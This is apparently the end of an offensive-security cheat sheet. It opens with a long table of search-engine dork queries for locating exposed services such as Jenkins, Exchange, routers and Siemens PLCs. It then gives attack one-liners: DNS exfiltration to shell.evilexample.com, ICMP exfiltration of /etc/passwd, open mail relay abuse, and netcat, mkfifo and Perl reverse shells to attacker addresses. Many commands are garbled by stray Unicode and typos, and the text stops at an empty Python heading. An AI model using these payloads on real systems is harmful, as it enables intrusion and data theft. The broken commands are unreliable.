| SonarQube                    | product:"SonarQube" port:"9000"                                                                                                                                                                                                              | 443.https.get.title:"SonarQube"                                                                                                                                                                                    | http.title:"SonarQube"                                                                           | http.html_title:"SonarQube"                                                                                                                                    | http.title:"SonarQube"                                                                               | title:"SonarQube"                                                             | title:"SonarQube"                                                             | title="SonarQube"                                                                                                                                                      | SonarQube                                                                          | intext:"sonarqube" AND intext:"rights reserved"                                                                                                                      |
| Portainer                    | port:9000 portainer                                                                                                                                                                                                                          | 443.https.get.headers.server: portainer                                                                                                                                                                            | http.html: "Portainer" && http.url: "/api/status"                                                | http.request.method: GET && http.request.uri.path: /api/status && http.response.body: Portainer                                                                | http.component:portainer && http.component_category: application                                     | app:"Portainer" && port:"9000"                                                | port:9000 AND service:portainer                                               | title="Portainer" && header="Powered by Portainer" && protocol="https"                                                                                                 | title:"Portainer"                                                                  | title:"Portainer"                                                                                                                                                    |
| Terraform                    | product:terraform                                                                                                                                                                                                                            | terraform                                                                                                                                                                                                          | terraform                                                                                        | product:terraform                                                                                                                                              | product:terraform                                                                                    | app:terraform                                                                 | product:terraform                                                             | title="Terraform Enterprise" \|\| header="Terraform-Backend"                                                                                                           | terraform                                                                          | terraform                                                                                                                                                            |
| DefectDojo                   | product:DefectDojo                                                                                                                                                                                                                           | 443.https.get.body_sha256:53cfb82d5b321381f08a4a32d3b4e4b82fb8a79c0b54d3e0f9431b3737ebea88                                                                                                                         | http.html_hash:53cfb82d5b321381f08a4a32d3b4e4b82fb8a79c0b54d3e0f9431b3737ebea88                  | metadata.product:DefectDojo                                                                                                                                    | http.html.hash.sha256:53cfb82d5b321381f08a4a32d3b4e4b82fb8a79c0b54d3e0f9431b3737ebea88               | title:"DefectDojo" \|\| body:"DefectDojo"                                     | app.name:"DefectDojo"                                                         | title="DefectDojo"                                                                                                                                                     | http.html_hash:53cfb82d5b321381f08a4a32d3b4e4b82fb8a79c0b54d3e0f9431b3737ebea88    | http.html_hash:53cfb82d5b321381f08a4a32d3b4e4b82fb8a79c0b54d3e0f9431b3737ebea88                                                                                      |
| Zabbix                       | zabbix                                                                                                                                                                                                                                       | product:zabbix                                                                                                                                                                                                     | zabbix                                                                                           | zabbix                                                                                                                                                         | zabbix                                                                                               | zabbix                                                                        | zabbix                                                                        | title="Zabbix" \|\| body="Zabbix"                                                                                                                                      | Zabbix                                                                             | Zabbix                                                                                                                                                               |
| Sentry                       | Server: Sentry                                                                                                                                                                                                                               | 443.https.get.body_sha256: contains c0b207c6b18d6a12a6d740f328d137a23972915f6c3e3e3a6f79d125d9ba9522                                                                                                               | app: Sentry                                                                                      | http.user_agent: sentry*                                                                                                                                       | http.favicon.hash: 1103164611                                                                        | app:Sentry                                                                    | title:Sentry                                                                  | title=sentry                                                                                                                                                           | process_name:sentry*                                                               | product:Sentry                                                                                                                                                       |
| Grafana                      | grafana                                                                                                                                                                                                                                      | 443.https.get.title:grafana                                                                                                                                                                                        | https.html_title:"Grafana"                                                                       | http.useragent:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" http.html_title:"Grafana" | port:3000 title:"Grafana"                                                                            | app:grafana                                                                   | http.title:grafana                                                            | title="Grafana" \|\| header="grafana" \|\| body="grafana"                                                                                                              | https://grafana.*                                                                  | grafana                                                                                                                                                              |
| Nagios                       | "Nagios/HTTP" or "Nagios Core" or "Nagios XI"                                                                                                                                                                                                | "nagios" or "http.favicon.hash:-1301254336" and "http.title:Nagios Core"                                                                                                                                           | "nagios" or "http.html_hash:1875409680"                                                          | Nagios                                                                                                                                                         | title:"Nagios Core"                                                                                  | app:Nagios                                                                    | http.html: "Nagios Core"                                                      | title="Nagios Core" \|\| body="Nagios Core"" or "title="Nagios XI" \|\| body="Nagios XI"                                                                               | Nagios                                                                             | Nagios                                                                                                                                                               |
| Nextcloud                    | nextcloud                                                                                                                                                                                                                                    | 443.https.get.body_sha256:65db03f60e82d7c34a6b9455948f975931c90476e90e408d20f2af2db4699f25                                                                                                                         | nextcloud                                                                                        | http.html_body:nextcloud                                                                                                                                       | product:"Nextcloud"                                                                                  | title:"Nextcloud"                                                             | http.favicon.hash:-575579963                                                  | title="Nextcloud" \|\| header="Nextcloud" \|\| html="Nextcloud"                                                                                                        | nextcloud                                                                          | https://$DOMAIN/ocs/v2.php/apps/notifications/api/v1/notifications                                                                                                   |
| ZooKeeper                    | zookeeper                                                                                                                                                                                                                                    | 443.ports and product:zookeeper                                                                                                                                                                                    | service.name: zookeeper                                                                          | tags: zookeeper                                                                                                                                                | protocols: 'zookeeper'                                                                               | app:ZooKeeper                                                                 | service:'zookeeper'                                                           | app="ZooKeeper"                                                                                                                                                        | title:"ZooKeeper"                                                                  | product:zookeeper                                                                                                                                                    |
| Microsoft Exchange           | "microsoft exchange" port:25                                                                                                                                                                                                                 | 80.http.get.title:exchange                                                                                                                                                                                         | "microsoft exchange" in:hostname                                                                 | service:smtp app:"Microsoft Exchange"                                                                                                                          | "microsoft exchange" port:25                                                                         | "Microsoft Exchange Server" port:"25"                                         | "Microsoft Exchange" port:25                                                  | title="Outlook Web App"                                                                                                                                                | "microsoft exchange" port:25                                                       | app:"Microsoft Exchange" port:"25"                                                                                                                                   |
| Skype for Business           | "skype for business" port:5061                                                                                                                                                                                                               | "skype for business" AND port:5061                                                                                                                                                                                 | service.name:"skype" AND service.name:"tls" AND service.port:5061                                | "skype for business"                                                                                                                                           | Microsoft Skype for Business Server 2015" OR "Microsoft Skype for Business Server 2019               | app:"skype for business                                                       | skype for business" AND port:5061                                             | title="Skype for Business"                                                                                                                                             | skype for business                                                                 | skype for business                                                                                                                                                   |
| Microsoft Teams              | product:Microsoft Teams                                                                                                                                                                                                                      | 443.https.get.metadata.server: Microsoft-IIS/10.0 AND 443.https.tls.certificate.parsed.subject.organization:Microsoft Corporation AND 443.https.tls.certificate.parsed.subject.organizational_unit:Microsoft Teams | dns.nameservers:*.teams.microsoft.com                                                            | http.user_agent:teams AND tags.service:Teams                                                                                                                   | protocols:'microsoft-teams'                                                                          | app:'Microsoft Teams'                                                         | microsoft teams                                                               | title="Microsoft Teams" \|\| body="Microsoft Teams"                                                                                                                    | Microsoft Teams                                                                    | Microsoft Teams                                                                                                                                                      |
| Celery                       | "celery" http.component:"celery"                                                                                                                                                                                                             | celery                                                                                                                                                                                                             | celery                                                                                           | celery                                                                                                                                                         | celery                                                                                               | celery                                                                        | celery                                                                        | "title=c"elery" \|\| body=c"elery""                                                                                                                                    | celery                                                                             | celery                                                                                                                                                               |
| RabbitMQ                     | product:rabbitmq                                                                                                                                                                                                                             | 443.https.get.body:"RabbitMQ" or 8883.tls.tls.certificate.parsed.extensions.authority_key_identifier.0.key_identifier:"RabbitMQ Server"                                                                            | ssl_certificate.subject.common_name:rabbitmq*                                                    | metadata.product:rabbitmq                                                                                                                                      | protocols:"amqp" && product:"RabbitMQ"                                                               | app:"RabbitMQ Management"                                                     | title:"RabbitMQ Management"                                                   | title="RabbitMQ Management" \|\| body="RabbitMQ" \|\| header="RabbitMQ"                                                                                                | title:"RabbitMQ Management"                                                        | http.component:RabbitMQ                                                                                                                                              |
| Kafka                        | org.apache.kafka.common.security.authenticator" http.component:"http" -"303"                                                                                                                                                                 | metadata.protocol: "Kafka"                                                                                                                                                                                         | http.title:"kafka" OR http.title:"Apache Kafka" OR http.body:"kafka" OR http.body:"Apache Kafka" | "org.apache.kafka.common.security.authenticator" http.component:"http" -"303"                                                                                  | "kafka" OR "Apache Kafka"                                                                            | "Kafka" OR "Apache Kafka"                                                     | org.apache.kafka.common.security.authenticator" http.component:"http" -"303"  | title="Kafka" OR header="Apache Kafka"                                                                                                                                 | org.apache.kafka.common.security.authenticator" http.component:"http" -"303"       | org.apache.kafka.common.security.authenticator" http.component:"http" -"303"                                                                                         |
| OpenStack                    | openstack                                                                                                                                                                                                                                    | openstack                                                                                                                                                                                                          | openstack                                                                                        | openstack                                                                                                                                                      | openstack                                                                                            | openstack                                                                     | openstack                                                                     | openstack                                                                                                                                                              | openstack                                                                          | app="openstack"                                                                                                                                                      |
| SaltStack                    | Server: SaltStack                                                                                                                                                                                                                            | product:SaltStack                                                                                                                                                                                                  | http.favicon.hash:-1102536065 AND http.html_hash:1540850741                                      | os:saltstack                                                                                                                                                   | title:"SaltStack Enterprise"                                                                         | SaltStack                                                                     | SaltStack                                                                     | title="SaltStack" \|\| body="SaltStack" \|\| header="SaltStack"                                                                                                        | saltstack                                                                          | title:saltstack                                                                                                                                                      |
| OpenShift                    | Server: openshift                                                                                                                                                                                                                            | openshift                                                                                                                                                                                                          | openshift                                                                                        | service.openshift                                                                                                                                              | title:"openshift web console login"                                                                  | app:openshift                                                                 | openshift                                                                     | title="OpenShift Web Console" \|\| body="Powered by OpenShift"                                                                                                         | openshift                                                                          | openshift                                                                                                                                                            |
| Ceph                         | "ceph" port:6789                                                                                                                                                                                                                             | (443.ceph.cluster_name:) OR (7480.ceph.cluster_name:) OR (80.ceph.cluster_name:*)                                                                                                                                  | "Ceph" OR "Ceph dashboard"                                                                       | "Ceph MON" OR "Ceph OSD" OR "Ceph RadosGW"                                                                                                                     | "ceph" AND open_ports:6789                                                                           | "ceph" port:"6789"                                                            | "Ceph" OR "Ceph dashboard"                                                    | "title="Ceph" \|\| body="Ceph" \|\| h1="Ceph""                                                                                                                         | "title:Ceph" OR "intext:Ceph" OR "h1:Ceph"                                         | ceph                                                                                                                                                                 |
| Swagger                      | title:"swagger ui" or title:"swagger" http.favicon.hash:-1840653542                                                                                                                                                                          | 443.https.get.body.tags.name:"swagger-ui" or 443.https.get.body.tags.name:"swagger"                                                                                                                                | http.title:"swagger ui" or http.title:"swagger"                                                  | metadata.service_name:"swagger-ui" or metadata.service_name:"swagger"                                                                                          | title:"swagger ui" or title:"swagger"                                                                | title:"swagger ui" or title:"swagger"                                         | title:"swagger ui" or title:"swagger"                                         | title="Swagger" \|\| title="Swagger UI"                                                                                                                                | body:"swagger-ui" or body:"swagger"                                                | title:"swagger ui" or title:"swagger"                                                                                                                                |
| Prometheus                   | http.favicon.hash:-335242539 'Prometheus Time Series Collection and Processing Server'                                                                                                                                                       | product:prometheus                                                                                                                                                                                                 | http.headers.server:prometheus                                                                   | http.useragent:'prometheus'                                                                                                                                    | http.favicon.hash:-335242539 AND http.server.header:'prometheus'                                     | app:'Prometheus' header:'Prometheus' product:'Prometheus'                     | http.favicon.hash:-335242539 http.headers.server:prometheus                   | header=Prometheus" OR "body=Prometheus                                                                                                                                 | http.favicon.hash:-335242539 AND http.server.header:'prometheus'                   | http.favicon.hash:-335242539 AND http.response.body:Prometheus                                                                                                       |
| Redmine                      | http.component:"redmine" && http.title:"Redmine"                                                                                                                                                                                             | 443.https.get.metadata.product: "Redmine"                                                                                                                                                                          | http.html: "Redmine" OR http.html: "Redmine - Error"                                             | port: 80, 443 && http.get.body:"Redmine" OR http.get.body:"Redmine - Error"                                                                                    | http.html:"Redmine" OR http.html:"Redmine - Error"                                                   | title:"Redmine"                                                               | title:"Redmine"                                                               | title:"Redmine"                                                                                                                                                        | http.html:"Redmine" OR http.html:"Redmine - Error"                                 | product:Redmine                                                                                                                                                      |
| DokuWiki                     | http.component:dokuwiki                                                                                                                                                                                                                      | 443.https.get.metadata.server: DokuWiki                                                                                                                                                                            | http.html: dokuwiki                                                                              | http.server.metadata.product: dokuwiki                                                                                                                         | http.component:dokuwiki                                                                              | app:"DokuWiki"                                                                | http.favicon.hash: 682090857 AND http.html: "dokuwiki"                        | title="DokuWiki" \|\| header="DokuWiki"                                                                                                                                | product: DokuWiki                                                                  | title:"dokuwiki" \|\| body:"dokuwiki" \|\| pageHash:"dokuwiki"                                                                                                       |
| Jenkins                      | "Server: Jetty" "X-Jenkins"                                                                                                                                                                                                                  | "Jenkins" AND "200 OK"                                                                                                                                                                                             | "jenkins" OR "jenkins-ci"                                                                        | "tags.jenkins" OR "http.component:jenkins"                                                                                                                     | "title:Jenkins" OR "body:Jenkins"                                                                    | app:Jenkins                                                                   | service.name:jenkins                                                          | body.includes=Jenkins" OR "title.includes=Jenkins                                                                                                                      | "http.favicon.hash:118356961" OR "http.headers.server:Jetty(.*)(Jenkins\|jenkins)" | "intext:Jenkins intitle:Dashboard" OR "inurl:jenkins intitle:login"                                                                                                  |
| Bamboo                       | "Bamboo" port:8085                                                                                                                                                                                                                           | (443.https.tls.certificate.parsed.names: "bamboo" AND 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names: "bamboo") OR 8085.banner: "Atlassian Bamboo"                                         |                                                                                                  | http.useragent:"Atlassian HttpClient" http.uri.path:"/bamboo/"                                                                                                 | http.server.headers.product: "Atlassian-Bamboo"                                                      | app:"BambooHR"                                                                | http.title:"BambooHR" OR http.title:"Bamboo Login"                            | title="BambooHR" OR "Atlassian Bamboo"                                                                                                                                 | title:"BambooHR" OR title:"Atlassian Bamboo"                                       | "https://bamboohr.com/" OR "https://.bamboohr.com/" OR "https://.atlassian.net/bamboo"                                                                               |
| D-Link                       | Server: DWS-3024/DWS-4026                                                                                                                                                                                                                    | 443.https.get.body_sha256: 6db3cb97f7c6b921e6d8f17db874de6c54df6a4d4d8b4caad7724063907c0522                                                                                                                        | text:D-Link                                                                                      | dlink                                                                                                                                                          | title:'D-Link'                                                                                       | webapp='D-Link'                                                               | product: dlink                                                                | title="D-Link" \|\| body="D-Link"                                                                                                                                      | http.favicon.hash:1572591353                                                       | product:D-Link                                                                                                                                                       |
| TPLink                       | Server: TP-LINK                                                                                                                                                                                                                              | 443.https.get.body: "TP-LINK"                                                                                                                                                                                      | http.html: /tplinklogin.net/                                                                     | http.user_agent: "TP-LINK" or http.html: "tplinklogin.net"                                                                                                     | http.component: "TPLINK"                                                                             | app:"TP-LINK ROUTER"                                                          | http.html: /tplinklogin.net/ or http.html: /tplogin.cn/                       | title="TP-LINK" \|\| header="TP-LINK"                                                                                                                                  | HTTP Headers.server: TP-LINK                                                       | title:"TP-LINK"                                                                                                                                                      |
| HP iLO                       | HP-iLO-Server at / inurl:login.htm                                                                                                                                                                                                           | hp ilo" OR "hp integrated lights-out                                                                                                                                                                               | "HP-iLO-Server" OR "HP-iLO-4-Server" OR "HP-iLO-5-Server"                                        | title:"Integrated Lights-Out" hp" OR "HP Integrated Lights-Out http-title:"                                                                                    | title:"Integrated Lights-Out" hp" OR "HP Integrated Lights-Out http-title:"                          | app:"HP Integrated Lights-Out"" OR "app:"iLO"                                 | title:"Integrated Lights-Out" hp" OR "HP Integrated Lights-Out http-title:"   | header="HP-iLO-Server"" OR "header="HP-iLO-4-Server"" OR "header="HP-iLO-5-Server"                                                                                     | title:"Integrated Lights-Out" hp" OR "HP Integrated Lights-Out http-title:"        | product:hp integrated lights-out" OR "title:"Integrated Lights-Out" hp                                                                                               |
| Adobe Connect                | product:Adobe Connect                                                                                                                                                                                                                        | 443.https.get.metadata.server: AdobeConnect                                                                                                                                                                        | server.headers.server: AdobeConnect                                                              | http.html_body: adobeconnect.com                                                                                                                               | product:Adobe Connect                                                                                | title: Adobe Connect                                                          | 443.metadata.server: AdobeConnect                                             | title=Adobe Connect                                                                                                                                                    | Adobe Connect                                                                      | adobeconnect.com                                                                                                                                                     |
| Netgear                      | netgear                                                                                                                                                                                                                                      | netgear                                                                                                                                                                                                            | netgear                                                                                          | netgear                                                                                                                                                        | netgear                                                                                              | netgear                                                                       | netgear                                                                       | title=NETGEAR                                                                                                                                                          | product:NETGEAR                                                                    | netgear                                                                                                                                                              |
| Nexus                        | "nexus" http.favicon.hash:1319622454                                                                                                                                                                                                         | 443.https.get.headers.server: Nexus/*                                                                                                                                                                              | server:Nexus                                                                                     | http.html.headers.server: Nexus/*                                                                                                                              | product:nexus                                                                                        | webapp="Sonatype Nexus Repository Manager"                                    | nexus                                                                         | title="Sonatype Nexus Repository Manager" \|\| body="Nexus Repository Manager" \|\| body="Nexus Repository"                                                            | Nexus                                                                              | product:Nexus Repository                                                                                                                                             |
| SaltStack                    | product:"SaltStack" port:"4505,4506"                                                                                                                                                                                                         | 443.https.get.body_sha256:7c1dd60d42f7a496d16f584e7a0c2d1a7f904c4b4f54c4bb2cbff1ad78c520cb                                                                                                                         | app:SaltStack                                                                                    | metadata.product:"SaltStack"                                                                                                                                   | protocols:"smb" AND service.service_name:"smb" AND smb.banner:"SaltStack"                            | app:"SaltStack"                                                               | service.name:salt                                                             | app="SaltStack"                                                                                                                                                        | https.html.body:"SaltStack"                                                        | app:"SaltStack"                                                                                                                                                      |
| Graylog                      | "title:Graylog" OR "h1:Graylog"                                                                                                                                                                                                              | "title:Graylog" OR "h1:Graylog"                                                                                                                                                                                    | "title:Graylog" OR "h1:Graylog"                                                                  | "title:Graylog" OR "h1:Graylog"                                                                                                                                | Graylog                                                                                              | title:Graylog                                                                 | title:Graylog                                                                 | title:Graylog                                                                                                                                                          | title:Graylog                                                                      | title:Graylog                                                                                                                                                        |
| Bugzilla                     | "Bugzilla_login" port:"80, 443"                                                                                                                                                                                                              | product:Bugzilla                                                                                                                                                                                                   | http.favicon.hash:-431232002                                                                     | port:80 http.favicon.hash:-431232002                                                                                                                           | title:"Bugzilla"                                                                                     | title:"Bugzilla"                                                              | app:bugzilla                                                                  | title=Bugzilla                                                                                                                                                         | https:///bugzilla/                                                                 | intext:"Bugzilla_login"                                                                                                                                              |
| Siemens PLCs                 | "Siemens PLC" port:102, "Siemens PLC" port:502, "Siemens PLC" port:161, "Siemens PLC" port:2000, "Siemens PLC" port:102/tcp, "Siemens PLC" port:102/udp, "Siemens PLC" port:502/tcp, "Siemens PLC" port:161/tcp, "Siemens PLC" port:2000/tcp | ("Siemens" AND "plc") AND protocols: "modbus", "s7", "bacnet"                                                                                                                                                      | "Siemens" "PLC" site:*.com                                                                       | "Siemens PLC" OR "S7 PLC"                                                                                                                                      | "Siemens PLC" OR "Siemens Simatic" OR "Siemens S7"                                                   | "Siemens" "PLC"                                                               | "Siemens" "PLC"                                                               | title="Siemens" && title="PLC"                                                                                                                                         | Siemens PLC"                                                                       | Siemens PLC"                                                                                                                                                         |
| SolarWinds                   | "SolarWinds" port: 443, 80, 8443, 17778                                                                                                                                                                                                      | p443.http.get.title: "SolarWinds"                                                                                                                                                                                  | solarwinds                                                                                       | metadata.product: "solarwinds"                                                                                                                                 | http.component:SolarWinds                                                                            | app:"SolarWinds"                                                              | solarwinds                                                                    | title="SolarWinds" \|\| header="solarwinds"                                                                                                                            | solarwinds                                                                         | solarwinds                                                                                                                                                           |
| Joomla                       | "joomla" port:80,443,8080                                                                                                                                                                                                                    | (80.http.get.title:"Joomla!" OR 443.https.get.title:"Joomla!" OR 8080.http.get.title:"Joomla!") AND protocols:("80/http" OR "443/https" OR "8080/http")                                                            | http.title:"Joomla!" OR https.title:"Joomla!"                                                    | http.html_title:"Joomla!" OR https.html_title:"Joomla!"                                                                                                        | "Joomla" protocol:https                                                                              | "joomla" port:"80, 443, 8080"                                                 | title:"Joomla!"                                                               | title="Joomla!" \|\| header="Joomla!" \|\| body="Joomla!" \|\| banner="Joomla!"                                                                                        | "Joomla" && http                                                                   | app:"Joomla" AND (protocols:80 OR protocols:443 OR protocols:8080)                                                                                                   |
| WordPress                    | http.component:"wordpress" -http.title:"404" -http.title:"Not Found"                                                                                                                                                                         | 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names: wordpress                                                                                                                                  | http.html.body:wordpress                                                                         | http.html.body:/wp-content/                                                                                                                                    | http.component:"WordPress"                                                                           | app:"WordPress"                                                               | http.component=="WordPress"                                                   | title="WordPress" && protocol="https"                                                                                                                                  |                                                                                    | http.favicon.hash: -1412814735                                                                                                                                       |
| Drupal                       | http.favicon.hash:-335242539 drupal                                                                                                                                                                                                          | 443.https.get.body_sha256:*,27a1f1d7df1e0c9f89d0b35c2466e2bbbd8c6ca0ed6b62100d1f98f1c9cfbde7 drupal                                                                                                                | http.html_hash:563737271 drupal                                                                  | metadata.product:drupal                                                                                                                                        | protocols:80.http.get.headers.server:Drupal                                                          | app:"Drupal CMS"                                                              | HTTP.favicon.hash:-335242539 Drupal                                           | title="Powered by Drupal" \|\| body="This site is powered by Drupal" \|\| header="X-Generator: Drupal"                                                                 | product:drupal                                                                     | drupal                                                                                                                                                               |
| Laravel                      | "laravel" http.component:/laravel/                                                                                                                                                                                                           | p.server software:"nginx/1.16.1" && p.http.server_header:"Laravel"                                                                                                                                                 | http.html:/"Laravel Framework"/                                                                  | http.metadata.product:Laravel                                                                                                                                  | http.component:laravel                                                                               | app:"Laravel Framework"                                                       | http.favicon.hash:-318056997                                                  | app="laravel"                                                                                                                                                          | http.title:"Laravel"                                                               | http.html:/"Laravel Framework"/                                                                                                                                      |
| Zend Framework               | "Server: ZendServer" OR "Set-Cookie: ZDEDebuggerPresent"                                                                                                                                                                                     | p.http.components.name: "Zend Framework"                                                                                                                                                                           | p:http.component:zend                                                                            | http.component:zend-framework                                                                                                                                  | http.fingerprint.service: "Zend Server" OR http.html.xpath: "//*[contains(text(),'Zend Framework')]" | "PHPSESSID" "Zend Framework"                                                  | http.fingerprint.component:Zend                                               | title="Zend Framework"                                                                                                                                                 | http.html.body: "Zend Framework"                                                   |                                                                                                                                                                      |
| Symfony                      | "Server: Symfony" OR "X-Symfony-Version"                                                                                                                                                                                                     | 443.https.get.title: "Welcome to Symfony"", "80.http.get.title: "Welcome to Symfony"", or "80.http.get.body: "Powered by Symfony"                                                                                  | http.html_body:Symfony                                                                           | http.server_header:Symfony                                                                                                                                     | http.favicon.hash:3964474325                                                                         | app:Symfony                                                                   | Symfony                                                                       | title="Welcome to Symfony" \|\| header="X-Symfony-Version"                                                                                                             | Symfony                                                                            | Symfony                                                                                                                                                              |
| Node.js Express              | http.favicon.hash:-335242539 'set-cookie: connect.sid' 'X-Powered-By: Express'                                                                                                                                                               | 443.https.get.body_sha256:5npHOpkBQmXv+7M1fYOtFkx7fW8IvSbzzNNQoWXq3G4 AND 443.https.tls.certificate.parsed.subject.common_name:*.nodejitsu.com                                                                     | http.headers.server:Express AND http.html.body:express                                           | http.favicon.hash:-335242539 AND http.headers.server:Express                                                                                                   | http.favicon.hash:-335242539 AND http.headers.server:Express                                         | app: "node.js express"                                                        |                                                                               |                                                                                                                                                                        |                                                                                    |                                                                                                                                                                      |
| Roundcube                    | "roundcube" http.component:"roundcube"                                                                                                                                                                                                       | (443.https.tls.certificate.parsed.names: "webmail.yourdomain.com") AND protocols: ["443/https"] (25.smtp.starttls.tls.certificate.parsed.names: "webmail.yourdomain.com") AND protocols: ["25/smtp"]               | http.html_body: "Roundcube Webmail"                                                              | web.server: "roundcube"                                                                                                                                        | roundcube                                                                                            | app:"roundcube"                                                               | roundcube                                                                     | title="Roundcube Webmail"                                                                                                                                              | Roundcube                                                                          | http.favicon.hash: "3261056547"                                                                                                                                      |
| Zimbra                       | "zimbra" port:7071, "zimbra" port:8443                                                                                                                                                                                                       | 80.http.get.title:"Zimbra Web Client" OR 80.http.get.title:"Zimbra Login" OR 443.https.get.title:"Zimbra Web Client" OR 443.https.get.title:"Zimbra Login"                                                         | html.title:"Zimbra"                                                                              | zimbra                                                                                                                                                         | product:"Zimbra Collaboration Server"                                                                | zimbra                                                                        | zimbra                                                                        | title="Zimbra Web Client" \|\| title="Zimbra Login" \|\| body="Zimbra Collaboration Server" \|\| header="zimbra" \|\| header="Zimbra"                                  | zimbra                                                                             | zimbra                                                                                                                                                               |
| Manage Engine ServiceDesk    | Server: ManageEngine_ServiceDesk                                                                                                                                                                                                             | 443.https.tls.certificate.parsed.subject.organization:ManageEngine                                                                                                                                                 | domain:'servicedesk.*.manageengine.com'                                                          | http.favicon.hash:-1360563422                                                                                                                                  | title:'ManageEngine ServiceDesk Plus'                                                                | title:'ManageEngine ServiceDesk Plus - Login'                                 | http.html: /ManageEngine/ServiceDeskPlus/                                     | title="ManageEngine ServiceDesk Plus" \|\| body="Powered by ServiceDesk Plus" \|\| body="ManageEngine ServiceDesk Plus" \|\| header="Server: ManageEngine_ServiceDesk" | title:'ServiceDesk Plus - Log in'                                                  | http.title:'ServiceDesk Plus - Log in' OR body:'ServiceDesk Plus - Log in' OR http.title:'ServiceDesk Plus - Self Service' OR body:'ServiceDesk Plus - Self Service' |
| Delta Electronics InfraSuite | "http.component:InfiniManage" "InfraSuite Device" "Delta Electronics" censys: 443.https.get.headers.server: InfiniManage AND 443.https.tls.certificate.parsed.subject.organization:Delta Electronics Inc                                     | html.body:InfiniManage AND html.title:InfraSuite Device AND html.body:Delta Electronics                                                                                                                            | html.body:InfiniManage AND html.title:InfraSuite Device AND html.body:Delta Electronics          | tag:"infinimanage" AND tag:"device" AND tag:"infrasuite" AND tag:"delta electronics"                                                                           | html.title:"InfiniManage" AND html.body:"InfraSuite Device" AND html.body:"Delta Electronics"        | app:"InfiniManage" AND title:"InfraSuite Device" AND body:"Delta Electronics" | title:"InfraSuite Device" AND body:"Delta Electronics" AND app:"InfiniManage" | title="InfiniManage" && body="InfraSuite Device" && body="Delta Electronics"                                                                                           | title:InfiniManage AND body:InfraSuite Device AND body:"Delta Electronics"         | "InfiniManage" AND "InfraSuite Device" AND "Delta Electronics"                                                                                                       |
| PandoraFMS                   | http.favicon.hash:-335242539 port:80 pandorafms                                                                                                                                                                                              | 443.https.tls.certificate.parsed.subject.common_name: pandorafms                                                                                                                                                   | pandorafms                                                                                       | port:80 http.component:pandoraFMS                                                                                                                              | http.favicon.hash:-335242539 pandorafms                                                              | title:"Pandora FMS - Login"                                                   | pandorafms                                                                    | title="Pandora FMS" \|\| body="Powered by Pandora FMS"                                                                                                                 | https://app.pandorafms.com/                                                        | app:pandorafms                                                                                                                                                       |
| Lexmark printers             | "lexmark" "HTTP/1.1 200 OK" "Server: Lexmark"                                                                                                                                                                                                | "lexmark" and 443.https.get.headers.server: Lexmark                                                                                                                                                                |                                                                                                  | metadata.product:lexmark                                                                                                                                       | http.title:"Lexmark"                                                                                 | app:"Lexmark-HttpServer"                                                      | service:lexmark                                                               | title="Lexmark"                                                                                                                                                        | lexmark                                                                            | lexmark                                                                                                                                                              |


## Browser Cache

### Firefox

```
𝑐𝑑 /. 𝑚𝑜𝑧𝑖𝑙𝑙𝑎/𝑓𝑖𝑟𝑒𝑓𝑜𝑥/4𝑝𝑧𝑔𝑞𝑔𝑗4. 𝑑𝑒𝑓𝑎𝑢𝑙𝑡 − 𝑟𝑒𝑙𝑒𝑎𝑠e
𝑠𝑞𝑙𝑖𝑡𝑒3 𝑝𝑙𝑎𝑐𝑒𝑠. 𝑠𝑞𝑙𝑖𝑡𝑒
.𝑡𝑎𝑏𝑙𝑒𝑠
𝑠𝑒𝑙𝑒𝑐𝑡 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠. 𝑢𝑟𝑙 𝑓𝑟𝑜𝑚 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠;
. 𝑞𝑢𝑖
```

## File transfer

### Transfer by ftp without direct access to shell

```text
echo open ip 21 ftp.txt
echo user ftp.txt
echo pass ftp.txt
echo bin ftp.txt
echo GET file tp.txt
echo bye ftp.txt
ftp -s:ftp.txt
```

### Transfer Dns in Linux

```text
On victim:
1. Hex encode the file to be transferred
    xxd -p secret file.hex
2. Read in each line and do a DNS lookup
    forb in 'cat fole.hex'; do dig $b.shell.evilexample.com; done

Attacker:
1. Capture DNS exfil packets
    tcdpump -w /tmp/dns -s0 port 53 and host system.example.com
2. Cut the exfilled hex from the DNS packet
    tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d'
    cut -f1 -d'.' | uniq received. txt
3. Reverse the hex encoding
    xxd -r -p received~.txt kefS.pgp
```

### Execute the exfil command and transfer its information with icmp

```text
On victim (never ending 1 liner):
     stringz=cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n";
counter=0; while (($counter = ${#stringZ})) ;do ping -s 16 -c l -p
${stringZ:$counter:16} 192.168.10.10 &&
counter=$( (counter+~6)) ; done

On attacker (capture pac~ets to data.dmp and parse):
tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
```

### Open mail relay

```text
C:\ telnet x.x.x.x 25
Hello x.x.x.x
MAIL FROM: me@you.com
RCPT TO: YOU@YOU.com
DATA
Thank you.
quit
```


## Reverse loose

### Netcat command \(\* run on the attacker's system\)

```text
nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell
nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
```

### Netcat command \(-e may not be supported in some versions\)

```text
nc -e /bin/sh 10.0.0.1 1234
```

### Netcat command for when -e is not supported

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.105 9999 >/tmp/f
```

### Perl language

```text
perl -e 'use Socket; $i="10.0.0.l"; $p=1234; socket (S, PF INET, SOCK STREAM,
getprotobjname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN," &S") ;open(STDOUT," &S"); open(STDERR," &S"); exec("/bin/sh" -i");};'
```

### Perl language without /bin/sh

```text
perl -MIO -e '$p=fork;exit,if($p);$c=new
IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN- fdopen($c,r);$~-fdopen($
c, w) ; system$_ while ;'
```

### Perl language for windows

```text
perl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN-fdopen($
c,r) ;$~- fdopen($c,w) ;system$_ while ;'
```

### Python language

```text
